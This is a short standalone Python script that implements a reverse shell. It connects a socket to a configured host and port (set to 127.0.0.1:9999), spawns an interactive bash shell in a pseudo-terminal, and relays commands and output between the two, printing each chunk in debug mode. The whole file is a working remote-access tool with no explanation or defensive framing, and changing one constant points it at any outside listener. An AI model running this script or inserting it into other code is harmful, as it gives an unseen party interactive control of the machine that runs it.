#!/usr/bin/env python3

import socket
import select
import pty
import os
import io

HOST = '127.0.0.1'
PORT = 9999
TRANSFER_CHUNK_SIZE = 2048
DEBUG_MODE = True


def run_bash_pty():
    pid, fd = pty.fork()

    if pid == 0:
        # Child
        os.execv('/bin/bash', ('-i',))
    else:
        return fd


def debug(*args, **kwargs):
    if DEBUG_MODE:
        print(*args, **kwargs)


sock = socket.socket()
sock.connect((HOST, PORT))
sock.send("Connected\n\r".encode('utf8'))

bash_fd = run_bash_pty()
bash_stdout = io.open(bash_fd, 'rb', buffering=0)
bash_stdin = io.open(bash_fd, 'wb', buffering=0)

try:
    while True:
        r, w, e = select.select([sock, bash_stdout], [], [])

        if sock in r:
            data = sock.recv(TRANSFER_CHUNK_SIZE)

            if len(data) > 0:
                debug("Received len: ", len(data), " Str Data: ", str(data))
                bash_stdin.write(data)

        if bash_stdout in r:
            response_data = bash_stdout.read(TRANSFER_CHUNK_SIZE)
            debug("Sending (", len(response_data), "), Content: ", str(response_data))
            sock.send(response_data)

finally:
    sock.close()
